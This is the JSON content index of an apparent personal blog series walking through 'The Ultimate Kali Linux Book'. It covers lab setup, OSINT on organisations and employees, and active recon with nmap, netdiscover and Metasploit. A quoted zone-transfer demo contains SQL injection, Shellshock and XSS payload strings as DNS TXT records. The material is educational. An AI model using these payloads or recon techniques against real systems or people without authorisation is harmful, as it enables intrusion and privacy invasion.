intns2.zonetransfer.me. 300 IN A 52.91.28.78 office.zonetransfer.me. 7200 IN A 4.23.39.254 ipv6actnow.org.zonetransfer.me. 7200 IN AAAA 2001:67c:2e8:11::c100:1332 owa.zonetransfer.me. 7200 IN A 207.46.197.32 robinwood.zonetransfer.me. 302 IN TXT \u0026#34;Robin Wood\u0026#34; rp.zonetransfer.me. 321 IN RP robin.zonetransfer.me. robinwood.zonetransfer.me. sip.zonetransfer.me. 3333 IN NAPTR 2 3 \u0026#34;P\u0026#34; \u0026#34;E2U+sip\u0026#34; \u0026#34;!^.*$!sip:customer-service@zonetransfer. sqli.zonetransfer.me. 300 IN TXT \u0026#34;\u0026#39; or 1=1 --\u0026#34; sshock.zonetransfer.me. 7200 IN TXT \u0026#34;() { :]}; echo ShellShocked\u0026#34; staging.zonetransfer.me. 7200 IN CNAME www.sydneyoperahouse.com. alltcpportsopen.firewall.test.zonetransfer.me. 301 IN A 127.0.0.1 testing.zonetransfer.me. 301 IN CNAME www.zonetransfer.me. vpn.zonetransfer.me. 4000 IN A 174.36.59.154 www.zonetransfer.me. 7200 IN A 5.196.105.14 xss.zonetransfer.me. 300 IN TXT \u0026#34;\u0026#39;\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;Boo\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34; zonetransfer.me. 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 172800 900 3600 ;; Query time: 100 msec ;; SERVER: 34.225.33.2#53(nsztm2.digi.ninja) (TCP) ;; WHEN: Wed Apr 10 07:15:39 BST 2024 ;; XFR size: 51 records (messages 1, bytes 2141) Going through these records from the zone transfer we can see contact details for \u0026ldquo;Robin Wood\u0026rdquo; robin@digi.ninja\n3. Discovering live systems on a network # Relying on just DNS scanning isn\u0026rsquo;t sufficient and I will need better tools to gain more useful information.\n3.1 Using netdiscover # A helpful built-in tool which comes with kali as a way to scan available devices on a connected network with passive mode available which doesn\u0026rsquo;t probe packets to devices.\nsudo netdiscover -pf # Random, passive and fast scan sudo netdiscover -r 172.30.1.0/24 # Range scan -p Passive option will listen to packets that are being sent -f Fast mode, saves time for auto scans 3.2 Using nmap to discover devices and ports # Nmap is most known for it\u0026rsquo;s port scanning abilities, but it also have additional features such as scripts exploit for enumeration and device discovery. Find out more about Nmap\u0026rsquo;s host discovery feature: Nmap Manual - host discovery nmap -sn 172.30.1.0/24 --exclude 172.30.1.1 # Device range scan, exlcude given ip nmap \u0026lt;IP\u0026gt; # Will scan for ports up to 1000 nmap -A -T4 -p- \u0026lt;IP\u0026gt; # Version scan, Timing, port scan all or specific -p\u0026lt;port range\u0026gt; nmap -O \u0026lt;IP\u0026gt; # Displays the operating system of target nmap \u0026lt;IP\u0026gt; -D\u0026lt;IP1\u0026gt;,\u0026lt;IP2\u0026gt;,.. # Add decoys to scan, ensure decoys are online nmap -sV \u0026lt;IP\u0026gt; # Give version of port technology used 3.3 Using Metasploit to discover ports # A framework designed to provide a suite of scripts for recon, exploits, payload generation and post-exploitation features which all fall within their own categories:\nAuxiliary are reconnaissance methods to gather data on a target Exploits will use vulnerabilities found and leverage them on the targeted host Payloads are used to execute commands on a remote host Posts used after a machine has been compromised The recon scripts can be found within the auxiliary category when searching for technologies to scan.\n# Scan for auxiliary tools, add more keywords for specific tech msf6\u0026gt; search auxiliary \u0026lt;keyword\u0026gt; # Load module msf6\u0026gt; use auxiliary/scanner/portscan/syn 3.3.1 Using Metasploit to enumerate SSH ports # An example of using the auxiliary scanners would be to scan for ssh versions which has been open on our target machine.\nUse this tool within the Metasploit framework msf6\u0026gt; use auxiliary/scanner/ssh/ssh-version\nset the target with msf6 (ssh_version)\u0026gt; set RHOSTS \u0026lt;IP\u0026gt; and run\nThis concludes everything for my walkthrough for chapter 3 of ‘The Ultimate Kali Linux Book’ by Glen D. Singh.\nFeel like I am picking up on speed slowly as I am working towards my note taking skills so posting blogs will take less time and will ideally be what I take notes on, anyways next section will be on scanning for vulnerabilities which is the next step after the recon phase. Hope to see you there.\nReferences # https://digi.ninja/projects/zonetransferme.php - Zone transfer demo https://nmap.org/book/man-host-discovery.html - Nmap host discovery documents ","date":"9 Apr, 2024","externalUrl":null,"permalink":"/posts/part-3-exploring-active-reconnaissance-techniques/","section":"Blog","summary":"Scratching the surface of the vast world of active recon, exploring tools which provide juicy information such as nmap, metasploit, netdiscover and more.","title":"Part 3 Exploring Active Reconnaissance Techniques"},{"content":"","date":"31 Mar, 2024","externalUrl":null,"permalink":"/all-in-one/","section":"All-in-Ones","summary":"","title":"All-in-Ones"},{"content":"","date":"24 Mar, 2024","externalUrl":null,"permalink":"/tags/anonymity/","section":"Tags","summary":"","title":"Anonymity"},{"content":"Techniques to avoid traces back to identity, browsing the web to collect information on a target and social media account leaks.\nWelcome to the second part of my walkthrough of \u0026lsquo;The Ultimate Kali Linux Book\u0026rsquo; by Glen D. Singh, for this section I will be covering different passive open source intelligence techniques (OISNT) which are ways to collecting information on a target available openly on the internet.\nInformation doesn\u0026rsquo;t need to be secret to be valuable, which is why we should be cautious of what information we put out on the internet. I will be demonstrating common tools used for OSINT, ways to mask investigations from target and how data collected can be used in a attack.\n1. Anonymising Traffic during Investigations # When penetesting an organisation it\u0026rsquo;s important to mask my identity as #1 it will test out the intrusion detection systems in placed and #2 it\u0026rsquo;s good practice to use OPSEC.\n1.2 Using Proxy chaining to mask traffic # A proxy is basicly a computer which you past down requests to a destination for you. A proxy chain is basicly like a relay race where you past the batton (requests) to the next person and they do the same to the last chain.\nHarder to track: Proxy chains are used as they make it harder for a request to be traced back to its original source as logs have to be requested from proxy which can be time consuming and lot of work.\nFind out more on proxies here: [All-on Proxies] 1.3 Using Virtual Private Networks (VPN) to mask traffic # A VPN is similar to a proxy where you relay your traffic to another computer so the request comes from them and shows their ip instead of yours.\nUsing a VPN is great for changing your location but I would say their not a worthy technique to mask traffic as their are lots of issues which arise with VPNs. [1]\nFind out more about VPNs here: [All-on VPNs] 2. Gathering an Organisation\u0026rsquo;s IT Infrastructure # When pentesting an organisation, 80% of the process will be gathering information through the internet and scanners, the other 20% will be exploiting findings and writing detailed reports.\nThere are plenty of tools out there that will scrape the internet for information on a target which I think some are more helpful than others but it doesn\u0026rsquo;t hurt to check most of them as one piece of information can make all the difference during recon.\n2.1 Using Whois # Whois is a tool which allows you to pull information from a public database of who is behind a certain domain name. When registering a website some services will provide the option to hide information hosted to the databse for a fee.\nThis includes:\nRegistrants Administrative contact information Dates on registration, update and expiration Registry domain ID Name servers 2.1.1 Linux Whois tool # $ whois \u0026lt;domain\u0026gt; 2.1.2 Website Whois alternative # There are also whois domain lookup tools online which will organise information pulled in a more readable format such as: https://whois.domaintools.com\n2.2 Using Job Listings # Another great way to get information of an organisation\u0026rsquo;s infrastructure is by looking at job postings for IT positions as these will list technologies they may use.\nHere is what I\u0026rsquo;ve found from a job listing for a system developer programmer post, these can all be researched for vulnerabilities especially the MS SQL server (2008-19) as this shows they may use older software. [2]\n2.3 Shodan.io # Shodan is an online provider which allows professionals lookup the domain of a website to provide with:\nOpen ports Known vulnerability CVE codes Technologies used hosted on ports This can be useful for discovering possible entry points on a target but I think this isn\u0026rsquo;t worth the $69/month price tag as most results are from large organisations and isn\u0026rsquo;t helpful for smaller targets.\n2.4 Maltego # Maltego is a reconnasaince tool which provides a unique way to display scans done through the use of graphs to help you visualise the layout of a target. This can automate the process of scanning for publicly accessible servers, IP addresses, employee\u0026rsquo;s email addresses, subdomains of web pages and more. You can start by creating a new graph \u0026gt; entity menu \u0026gt; infrastructure \u0026gt; click and drag domains onto graph Here is a demonstration of Maltgeo scanning Microsoft.com for similar domains and emails it can scrape from the internet. 3. Gathering Employees\u0026rsquo; information # Now it is ever more common to find and gather employee credentials and the culture of an organisation as more and more people use social media as their daily routine which entices them to share things that organisations wouldn\u0026rsquo;t want to be exposed online such as:\nPictures of employee badge Technologies used in background such as on screens, cameras, SCADA systems Uniforms and work culture 3.1 Instagram / Facebook / Linkedin # Using Instagram, Facebook and Linkedin can be helpful as most organisations will have an online precense which is worth check for any valuable information, these can be usually found in posts made, tagged posts or events.\n3.2 Recon-ng # The Recon-ng framework is designed to bring all common OSINT tools under one roof for convinience by providing menus for navigation and management of information found.This tool comes pre-installed with Kali and the documents can be found here: https://github.com/lanmaster53/recon-ng In the demo above I have loaded the \u0026lsquo;whois_procs\u0026rsquo; module which will search for names and emails related to a domain. After configuration the run command is used which will execute the scrapping and produce a list of results: 3.3 theHarvester # The Harvester is another tool which is similar to Recon-ng where it serves as a central tool to scrap information such as emails, names, phone number and more from difference sources. It comes pre-install with Kali and its documents can be found here: https://github.com/laramies/theHarvester\n# Open help menu $ theHarvester -h #Perform a scan with specific module $ theHarvester -d microsoft.com --dns-server 8.8.8.8 [module] 3.4 Sherlock # The Sherlock project is a open-source tool which will search over 200 possible social media platforms for a given username. This is especially helpful to scan for a persons online precences once their username is found (e.g. Instagram username can be used)\nInstallation # $ git clone https://github.com/sherlock-project/sherlock.git $ cd sherlock/ $ sudo pip install -r requirements.txt Search accounts with:\n$ python3 sherlock \u0026lt;username\u0026gt; $ python3 sherlock \u0026lt;username\u0026gt; --timeout 5 # 5 sec search May result with unrelated accounts to target Sherlock is a great tool however, it may result with accounts that aren\u0026rsquo;t related to the target if their username is common or too broad but it is still worth looking through the list\nThis concludes everything for my walkthrough or the reconnaissance and footprinting section of ‘The Ultimate Kali Linux Book’ by Glen D. Singh. In the next section I will be covering active reconnaissance techniques such as nmap, Google dorks, metasploit and more.\nReferences # https://restoreprivacy.com/vpn/warning-list/ https://www.cvedetails.com/vulnerability-list/vendor_id-26/product_id-251 https://github.com/lanmaster53/recon-ng https://github.com/laramies/theHarvester ","date":"24 Mar, 2024","externalUrl":null,"permalink":"/posts/part-2-reconnaissance-and-footprint/","section":"Blog","summary":"Techniques to avoid traces back to identity, browsing the web to collect information on a target and social media account leaks.","title":"Part 2 Reconnaissance and Footprint"},{"content":"","date":"17 Mar, 2024","externalUrl":null,"permalink":"/tags/lab/","section":"Tags","summary":"","title":"Lab"},{"content":"Building virtual machines, installing Kali Linux, Metasploitable 2\u0026amp;3, OWASP web applications and windows machines for advanced testing.\nWelcome to the first part of my walkthrough for \u0026lsquo;The Ultimate Kali Linux Book\u0026rsquo; by Glen D. Singh, this is a highly recommended book from Packt which have a reputation of providing top quality content for the IT industry. In this part I will be building multiple lab environments with vulnerable machines which I can utilise to test out different penetration techniques in a safe and legal network.\n1. First lab within VirtualBox # The diagram demonstrate the environment for this first network lab where I will be using a popular penetration OS, Kali Linux to test out the different tools that comes within its arsenal.\nFor the virtual machine of choice I went with Vbox due to previous experience with the software in the past however, upon research for different types of virtualisation I came across KVM/Qemu which is a fully open-source and a higher frequency of security update with transparent reports whereas Oracle provides security through obscurity.\n2. Setting up network interfaces using vboxmanage # Inside a terminal type the following commands\nCreate a dhcpserver called \u0026ldquo;PentestNet\u0026rdquo; vboxmanage dhcpserver add --network=PentestNet --server-ip=172.30.1.1 --lower-ip=172.30.1.20 --upper-ip=172.30.1.50 --netmask=255.255.255.0 --enable Create a dhcpserver called \u0026ldquo;HiddenNet\u0026rdquo; vboxmanage dhcpserver add --network=HiddenNet --server-ip=10.11.12.1 --lower-ip=10.11.12.20 --upper-ip=10.11.12.50 --netmask=255.255.255.0 --enable Create a dhcpserver called \u0026ldquo;RedTeamLab\u0026rdquo; vboxmanage dhcpserver add --network=RedTeamLab --server-ip=192.168.42.1 --lower-ip=192.168.42.20 --upper-ip=192.168.42.50 --netmask=255.255.255.0 --enable 3. Setting up Kali Linux # Going through the standard VMware installation for Kali linux I will need to assign it to networks so it has LAN connection to the other machines.\nIn settings of Kali VM, Adapter 1: Adapter 2: Adapter 3: 4. Setting up Metasploitable 2 # Install the iso file on the internet at https://sourceforge.net/projects/metasploitable/files/Metasploitable2/ and go through standard installation on VMware:\nIn VirtualBox New \u0026gt; Expert Mode \u0026gt; Name: Metasploitable2 \u0026gt; Memory:512M \u0026gt; Hard Disk \u0026gt; Use an Existing Virtual Hard Disk File \u0026gt; Hard Disk Selector \u0026gt; Add Metastpoitable.vmdk \u0026gt; Choose \u0026gt; Finish In settings of Metasploitable 2 Adapter 1: 5. Setting up Metasploitable 3 # To install Metasploitable 3 I used Vagrant, a command line utility tool to manage and download virtual machines pre-made on it\u0026rsquo;s repository. The installation process is simple and can be found here https://developer.hashicorp.com/vagrant/install.\nThe following commands were used:\n$ vagrant plugin install vagrant-reload $ vagrant plugin install vagrant-vbguest $ mkdir metasploitable3-workspace $ cd metasploitable3-workspace $ curl -O https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile \u0026amp;\u0026amp; vagrant up Encountering IP address configuration error during setup When setting up Vagrant I encountered an error message on a misconfigured IP range, upon further research I came across someone with a similar problem and found a solution here [1]\nIssue prompt: Fix for IP issue:\nsudo vim /etc/vbox/networks.conf Add an asterisk * in front of the lines *10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 *2001::/64 If the windows vagrant machine isn\u0026rsquo;t working try the command: vagrant up win2k8 6. Setting up OWASP Juice Shop website # On the Kali Linux VM terminal: $ curl -fsSL https://download.docker.com/linux/debian/gpg | gpg - dearmor | sudo tee /usr/share/keyrings/docker-archive-keyring.gpg \u0026gt;/dev/null $ echo \u0026#39;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian buster stable\u0026#39; | sudo tee /etc/apt/sources.list.d/docker.list $ sudo apt install -y docker-ce docker-ce-cli containerd.io $ sudo docker pull bkimminich/juice-shop $ sudo docker pull bkimminich/juice-shop Connect to OWASP website http://localhost:3000 7. Setting up OWASP Broken Web Applications # Install the zip file on the internet at https://sourceforge.net/projects/owaspbwa/files/\nThis will contain pre-made Vbox machines which needs to be connected to the lab network:\nVM Box \u0026gt; New \u0026gt; Expert Mode \u0026gt; Name: OWASP BWA \u0026gt; Type: Linux \u0026gt; Memory: 1024 MB \u0026gt; Hard Disk Selector add: OWASP Broken Web Apps-cl1.vmdk \u0026gt; Choose \u0026gt; Finish Click on Settings of OWASP Web \u0026gt; Network \u0026gt; Adapter 1 \u0026gt; Attached to: Internal Network \u0026gt; Name: PentestNet \u0026gt; OK Login : root:owaspbwa Here is what directing to the broken OWASP on a web browser should look like: This was it for this walkthrough on how to install and setuping up multiple virtual machines and having them connected to a private network for testing, there is an extended section to setup an environment for advanced hacking techniques but will be covered in a later part. Next I will be covering passive information-gather, one of the most important step to a great attack.\nReferences # https://stackoverflow.com/questions/70704093/the-ip-address-configured-for-the-host-only-network-is-not-within-the-allowed-ra ","date":"17 Mar, 2024","externalUrl":null,"permalink":"/posts/part-1-buidling-a-penetration-testing-labs/","section":"Blog","summary":"Building virtual machines, installing Kali Linux, Metasploitable 2\u0026amp;3, OWASP web applications and windows machines for advanced testing.","title":"Part 1 Building a Penetesting Lab"},{"content":"","date":"17 Mar, 2024","externalUrl":null,"permalink":"/tags/pentesting/","section":"Tags","summary":"","title":"Pentesting"},{"content":"","date":"1 Jan, 2020","externalUrl":null,"permalink":"/posts/","section":"Blog","summary":"","title":"Blog"},{"content":"","date":"1 Jan, 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors"}]